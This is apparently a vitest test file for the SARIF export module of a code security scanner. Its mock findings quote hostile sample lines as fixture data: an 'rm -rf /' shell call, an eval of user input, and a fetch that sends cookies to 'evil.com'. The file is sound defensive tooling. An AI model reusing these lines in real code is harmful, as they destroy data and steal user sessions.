/**
 * Tests for SARIF export module
 */

import { describe, it, expect } from 'vitest';
import { analysisResultToSarif, toSarifResult, sarifToJson } from '../src/sarif.js';

const mockResult = {
  resourceHash: '0xabcd1234',
  contentHash: '0xefgh5678',
  findings: [
    {
      patternId: 'EXEC_EVAL',
      name: 'Dynamic Code Execution',
      description: 'eval() can execute arbitrary code',
      severity: 'critical' as const,
      category: 'code_execution',
      line: 5,
      column: 10,
      match: 'eval(',
      context: 'const result = eval(userInput);',
    },
    {
      patternId: 'EXEC_SHELL',
      name: 'Shell Command Execution',
      description: 'Direct shell command execution',
      severity: 'critical' as const,
      category: 'code_execution',
      line: 10,
      column: 3,
      match: 'exec(',
      context: "child.exec('rm -rf /');",
    },
    {
      patternId: 'URL_SSRF',
      name: 'SSRF / HTTP to Suspicious Host',
      description: 'HTTP request to a suspicious URL',
      severity: 'high' as const,
      category: 'data_exfiltration',
      line: 15,
      column: 1,
      match: 'fetch(',
      context: "fetch('http://evil.com/steal?data=' + cookie);",
    },
  ],
  riskScore: 240,
  riskLevel: 'critical' as const,
  summary: {
    total: 3,
    critical: 2,
    high: 1,
    medium: 0,
    low: 0,
  },
  confidence: 0.85,
  analyzedAt: '2026-04-05T00:00:00.000Z',
};

describe('SARIF Export', () => {
  describe('toSarifResult', () => {
    it('maps critical severity to error level', () => {
      const result = toSarifResult(mockResult.findings[0], 'test.js');
      expect(result.level).toBe('error');
      expect(result.ruleId).toBe('EXEC_EVAL');
    });

    it('maps high severity to error level', () => {
      const result = toSarifResult(mockResult.findings[2], 'test.js');
      expect(result.level).toBe('error');
    });

    it('includes artifact location and region', () => {
      const result = toSarifResult(mockResult.findings[0], 'src/app.js');
      expect(result.locations[0].physicalLocation.artifactLocation.uri).toBe('src/app.js');
      expect(result.locations[0].physicalLocation.region.startLine).toBe(5);
      expect(result.locations[0].physicalLocation.region.startColumn).toBe(10);
      expect(result.locations[0].physicalLocation.region.snippet.text).toContain('eval');
    });
  });

  describe('analysisResultToSarif', () => {
    it('produces valid SARIF structure', () => {
      const sarif = analysisResultToSarif(mockResult, 'test.js');
      expect(sarif.version).toBe('2.1.0');
      expect(sarif.runs).toHaveLength(1);
      expect(sarif.runs[0].tool.driver.name).toBe('@isnad/scanner');
      expect(sarif.runs[0].results).toHaveLength(3);
    });

    it('de-duplicates rules by patternId', () => {
      const sarif = analysisResultToSarif(mockResult, 'test.js');
      const ruleIds = sarif.runs[0].tool.driver.rules.map(r => r.id);
      expect(ruleIds).toHaveLength(3);
      expect(ruleIds).toContain('EXEC_EVAL');
      expect(ruleIds).toContain('EXEC_SHELL');
      expect(ruleIds).toContain('URL_SSRF');
    });

    it('includes category in rule properties', () => {
      const sarif = analysisResultToSarif(mockResult, 'test.js');
      const execRule = sarif.runs[0].tool.driver.rules.find(r => r.id === 'EXEC_EVAL');
      expect(execRule?.properties.category).toBe('code_execution');
    });

    it('maps all results with correct severity levels', () => {
      const sarif = analysisResultToSarif(mockResult, 'test.js');
      const levels = sarif.runs[0].results.map(r => r.level);
      expect(levels).toContain('error');
    });
  });

  describe('sarifToJson', () => {
    it('valid JSON string', () => {
      const sarif = analysisResultToSarif(mockResult, 'test.js');
      const json = sarifToJson(sarif);
      const parsed = JSON.parse(json);
      expect(parsed.version).toBe('2.1.0');
      expect(parsed.runs).toHaveLength(1);
    });

    it('contains $schema field', () => {
      const sarif = analysisResultToSarif(mockResult, 'test.js');
      const json = sarifToJson(sarif);
      expect(json).toContain('sarif-schema-2.1.0');
    });
  });
});
